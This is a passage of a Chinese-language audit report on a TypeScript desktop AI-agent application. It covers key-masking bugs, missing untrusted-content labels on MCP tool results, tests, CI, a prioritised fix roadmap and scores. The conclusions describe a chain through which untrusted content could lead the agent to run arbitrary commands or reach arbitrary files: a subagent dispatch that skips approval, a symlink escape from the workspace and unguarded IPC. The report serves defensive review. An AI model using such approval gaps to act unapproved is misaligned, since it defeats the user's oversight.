- **描述**：设置页保存路径（`saveConfig`）会调用 `restoreMaskedKeys(next, existing)`，检测 `'***'` 占位符并回填真实密钥；`saveOnboardingConfig`（引导向导保存路径）没有这一步。`getConfig()` 返回给前端的 `apiKey` 都是掩码后的 `***xxxx`，如果任何引导向导 UI 流程用这份返回值预填表单、用户未改动直接提交，掩码字符串会被当作真实密钥写入 `model_config.json`，静默破坏该 provider 直到用户发现并重新输入密钥。
- **解决方案**：`saveOnboardingConfig` 内部同样调用 `restoreMaskedKeys(next, existing)`，或让 `buildWizardModelConfig` 对 `'***'` 前缀的值和空值做同等回退处理。

#### 问题 6 · MCP 工具结果缺少"不可信内容"标注，且始终标记为成功

- **文件位置**：`packages/core/src/mcp/adapter.ts:39-41`
- **审计后状态**：已处理。`MCPToolAdapter` 返回结构化 `ToolResult`，保留 MCP 协议 `isError`，并在 `modelContent` 前加入不可信输入说明；回归测试覆盖成功与错误结果。
- **描述**：`web_fetch` 和外部消息桥都会显式包裹一层"视为不可信输入"的提示，MCP 工具结果没有等价处理；同时 `mapResult` 从不检查 MCP 协议层的 `isError`，永远返回 `okResult`，下游依据 `isError` 做重试/告警的逻辑会把失败的 MCP 调用误判为成功。
- **解决方案**：`mapResult(raw) { return raw.startsWith('Error: ') ? errResult(raw, {...}) : okResult(raw, {...}) }`，并在结果前缀加一段类似 `[EXTERNAL_MESSAGE]` 的不可信内容标注。

### 检查后确认健全（值得记录，说明防护并非全面缺失）

- API Key 掩码链路（`model-service.ts::getConfig`/`redactApiKeys`/`ProviderSnapshot` 全部消费点）逐一核对完整，唯一缺口就是问题 5。
- `web_fetch` 有 SSRF 基础防护（拦截 `localhost`/`127.0.0.1`/`::1`/RFC1918 私网段，仅允许 `http`/`https`）。
- MCP stdio 子进程环境变量走 allow-list（`SAFE_ENV_KEYS`），不会把主进程完整 `process.env`（含各 provider API key）泄漏给第三方 MCP server 进程。
- Zip 导入（`skill-service.ts::installSkillArchive`）显式拒绝含 `.`/`..` 的 zip 成员路径，是良好的 zip-slip 防护。
- `desktop/src/main/protocol.ts` 的附件/媒体自定义协议处理器：ID 先过严格正则（`^att_\d{4}-\d{2}_[0-9a-f]{8}$`）再构造路径，且额外做 containment 复核；`protocol.test.ts` 已有穿越 payload 的回归用例。
- `BrowserWindow`：`contextIsolation: true`、`nodeIntegration: false` 正确设置；preload 暴露的是窄而具体的 API（`invokeCore`/`onCoreEvent`/`selectDirectory`），不是裸 `ipcRenderer`。
- `desktop-pet/` 子项目：同样正确设置 `contextIsolation`/`nodeIntegration`，无任何 IPC 暴露面，渲染器只用 `textContent` 写 DOM，无注入向量。
- `skills/*/scripts/*.py`：全仓库无 `shell=True`/`eval`/`exec`；`package_skill.py` 甚至显式拒绝符号链接、做路径包含性检查，是本次审计中路径穿越防护做得最扎实的文件。

---

## 九、日志与异常处理审计

- 日志体系评分：7/10 —— 284 个文件导入了 logger 框架（非 `print`/`console.log` 满天飞），但审计未逐一核实日志级别使用是否规范
- 异常处理评分：7/10 —— 全仓库未发现 `catch {}`/`catch(e){console.log(e)}` 式吞异常模式；`IPC` 层的 `safeIpcError` 正确剥离内部错误信息只暴露 `errorId`（有回归测试覆盖）；`TeamStore`/`WatchlistStore` 的 JSON 解析失败分支静默重置为默认值、不做 corrupt-isolation，是本维度唯一扣分点（详见第六节）

### 问题

- `packages/core/src/team/store.ts:27-32`、`packages/core/src/watchlist/store.ts:35-43`：解析失败直接 `catch {}` 回退默认值，不像项目里其他 store（`plans/store.ts`、`tasks/store.ts`、`scheduler/store.ts`）那样先把损坏文件重命名为 `*.corrupt-<ts>` 保留取证——下一次自动保存会永久覆盖掉损坏证据。

---

## 十、测试体系审计

| 模块                               | 单测                                    | 集成                                                              | E2E                                                                |
| ---------------------------------- | --------------------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------ |
| `packages/core`                    | ✓ 282 用例 / 46 文件，本次实跑全绿      | ✓（`core-api.test.ts`/`chat-service.test.ts` 等覆盖跨子系统装配） | —                                                                  |
| `desktop`（main/preload/renderer） | ✓ 152 用例 / 42 文件，本次实跑全绿      | ✓（`ipc.test.ts`/`protocol.test.ts` 覆盖 IPC/协议边界）           | `desktop/tests/visual/*.spec.ts`（Playwright，未在本次审计中实跑） |
| `desktop-pet`                      | ✓ 8 用例（`node --test`），本次实跑全绿 | —                                                                 | —                                                                  |
| `skills/*`                         | 无                                      | —                                                                 | —                                                                  |

**实跑证据**（本次会话真实执行，非引用旧记录）：

```
npm test --workspace @emperor/core   → Test Files 46 passed, Tests 282 passed
npm run typecheck --workspace @emperor/core → tsc --noEmit 零报错
cd desktop && npm run test           → Test Files 42 passed, Tests 152 passed
cd desktop && npm run typecheck      → vue-tsc + tsc --noEmit 零报错
```

### 缺失分析

- 本次审计发现的 6 个 High 级问题（dispatch_subagent 绕过审批、符号链接逃逸、IPC 无差别授权、scheduler 竞态、memory 非原子写、渲染进程流式持久化性能）**全部没有对应的回归测试**——这解释了为什么它们能在 434 个通过用例的前提下依然存在：现有测试覆盖的是"功能是否按预期工作"，而不是"安全/并发边界是否被违反"这一类。
- `saveOnboardingConfig` 掩码回填缺口同理：`model-config.test.ts`/`model-service.test.ts` 测试的是 `saveConfig` 路径，`saveOnboardingConfig` 路径没有等价的"提交掩码占位符"用例。

### 优先补充模块

| 模块                                        | 优先级 | 原因                                       |
| ------------------------------------------- | ------ | ------------------------------------------ |
| `filesystem.ts` 符号链接逃逸回归测试        | P0     | 已实测确认可复现，必须钉死防止回归         |
| `dispatch_subagent` 审批透传回归测试        | P0     | 修复后必须有测试防止再次被"优化掉"         |
| `scheduler` 并发场景（tick 执行中增删 job） | P0     | 修复竞态后需要用例验证 merge 逻辑          |
| `saveOnboardingConfig` 掩码占位符提交用例   | P1     | 低成本，直接复用 `saveConfig` 现有测试模式 |
| IPC 高危操作授权门（`mcp.saveConfig` 等）   | P1     | 修复后需要"未授权尝试被拒绝"的回归         |

---

## 十一、工程化审计

| 项           | 状态                                                                                                                     |
| ------------ | ------------------------------------------------------------------------------------------------------------------------ |
| README       | ✓（内容详实，含产品定位/架构说明）                                                                                       |
| Lint         | ✓（审计后已补 `packages/core/eslint.config.js` 与 `desktop/eslint.config.js`，接入 `make check`/CI）                     |
| Format       | ✗                                                                                                                        |
| Git Hooks    | ✓ `.pre-commit-config.yaml`                                                                                              |
| CI           | ✓ 三平台矩阵（ubuntu/macos/windows），覆盖 test+typecheck+build+package dry-run，且有 `git diff --check` 挡空白/冲突标记 |
| Docker       | ✗（桌面应用，非必需）                                                                                                    |
| 环境变量模板 | ✓ `.env.example`                                                                                                         |
| 部署文档     | ✓（README 内含产品定位与运行说明）                                                                                       |
| LICENSE      | ✓ MIT                                                                                                                    |
| CHANGELOG    | ✓                                                                                                                        |
| SECURITY.md  | ✓                                                                                                                        |

### 建议

- CI 矩阵和测试覆盖率本身是本次审计里最扎实的部分，建议保持；缺 ESLint 是唯一有意义的补强点（`tsc --noEmit` 能挡类型错误，但挡不住本次发现的这类"逻辑正确但架构不安全"的问题，两者不是同一层面的把关）。
- 补 `SECURITY.md`：既然应用自身文档已明确渲染进程可能是攻击面（问题 3 的前提），值得写清楚"发现安全问题应如何上报"。

---

## 十二、重构路线图

### P0 · 立即（≤ 2 天）—— 安全/数据正确性止血

1. **`dispatch_subagent` 传入真实 `controlManager`**（`agent/loop.ts:160,328`），补审批透传回归测试 —— 半天
2. **`filesystem.ts::resolvePath` 加 `realpath` 后再做包含性判断**，补符号链接逃逸回归测试 —— 半天
3. **`scheduler/service.ts` 接入已有的 `appendAction`/`mergeActions`/`withLock` 机制**，消除竞态 —— 1 天
4. **`memory/store.ts::writeMemory`/`writeUser` 改为 tmp+rename 原子写**（复用同文件里 `writeCheckpoint` 的模式） —— 1-2 小时
5. **IPC 层对高危可变更操作（`mcp.saveConfig`/`model.saveConfig`）加确认门**，`assertCoreMutationAllowed` 统一接入所有 mutation 操作 —— 1 天

### P1 · 提质（1-2 周）

- `run_command` 拒绝列表扩充 + `AUTO` 模式下高危命令仍走审批（问题 4）
- `saveOnboardingConfig` 补 `restoreMaskedKeys` 调用（问题 5）
- `useRuntime.ts` 流式持久化改为 debounce（第七节问题，High 性能项）
- `HistoryLog.append`/`TokenTracker`/`team/bus.ts`/`plans/store.ts` 补齐归档机制，对齐 `tasks/store.ts` 已有模式
- `TeamStore`/`WatchlistStore` 的 JSON 解析失败分支补 corrupt-isolation
- 拆 `runner.ts::stepAsync`（238 行）、`Composer.vue` 悬浮菜单去重、`compactJson` 去重
- 补 ESLint 配置

### P2 · 升级（持续）

- [x] MCP 工具结果补"不可信内容"标注 + 正确的 `isError` 透传
- [x] 渲染进程与 `@emperor/core` 之间共享 runtime event 基础类型定义
- [x] `hasCoreBridge()` 双路径分支收敛到 `api/http.ts` 的 `callCore` helper，并改造普通 mapped 调用点
- [x] 补 `SECURITY.md`/`CHANGELOG.md`
- [x] 覆盖率门禁完成评估：暂不启用硬阈值，等待稳定 baseline 后分阶段接入

---

## 十三、综合评分

| 维度     | 分数 |
| -------- | ---: |
| 项目结构 | 8/10 |
| 代码质量 | 6/10 |
| 架构设计 | 6/10 |
| 性能     | 5/10 |
| 安全     | 4/10 |
| 测试     | 8/10 |
| 工程化   | 7/10 |
| 可维护性 | 6/10 |

**总分：50/80 → 62.5/100 → 评级：B**（迁移完成度高、工程习惯扎实，但存在必须先处理的真实安全/并发缺口，未达到"可放心商业化/多人协作"门槛）

---

## 十四、最终结论

- **当前阶段**：Python→TS 迁移已经完成收尾（91 个测试文件、434 个测试用例全绿，typecheck 零报错，CI 三平台矩阵通过），代码库整体处于"功能正确、工程习惯良好"的健康状态。
- **最大问题**：权限/审批系统存在真实、可复现的覆盖缺口——`dispatch_subagent` 绕过审批 + 工作区围栏可被符号链接绕过 + IPC 层对高危操作无差别授权，三者叠加构成一条从"不可信内容"到"未经批准执行任意命令/读写任意文件"的完整链路。这类问题恰恰不会被现有的 434 个功能测试捕获，是本地单用户场景下也值得当真处理的架构级缺口，而非风格问题。
- **是否建议继续加功能**：否，先处理 P0。这五项修复成本都在 1 天以内，且都是"补上一个已经设计好但没接上的机制"（`realpath` 检查、`appendAction`、`controlManager` 透传），不是推倒重来。
- **是否建议先重构**：仅限 P0 范围内的安全/并发修复；代码质量层面的重构（`runner.ts` 拆分、`Composer.vue` 去重）可以和功能开发并行推进，不阻塞。
- **是否适合商业化**：P0 修复前不建议——`mcp.saveConfig` 的进程执行 pivot 和符号链接逃逸都是会被安全审查直接卡掉的问题。P0 修复后，结合当前的测试/CI 基础，具备继续往前推进的条件。
- **是否适合多人协作**：架构分层和约定一致性支持多人协作；缺 ESLint、缺覆盖率门禁是唯一需要补的工程化短板。

### 下一步最优先三件事

1.（半天）修 `filesystem.ts` 符号链接逃逸 + 补回归测试——影响面最广、最容易被独立验证的一条2.（半天）`dispatch_subagent` 传入真实 `controlManager` + 补审批透传回归测试——修复"审批系统形同虚设"这一最核心的信任问题3.（1 天）`scheduler/service.ts` 接入已有的 `appendAction`/`mergeActions` 机制——三者中实现成本最高，但代码已经写好、只是没接线
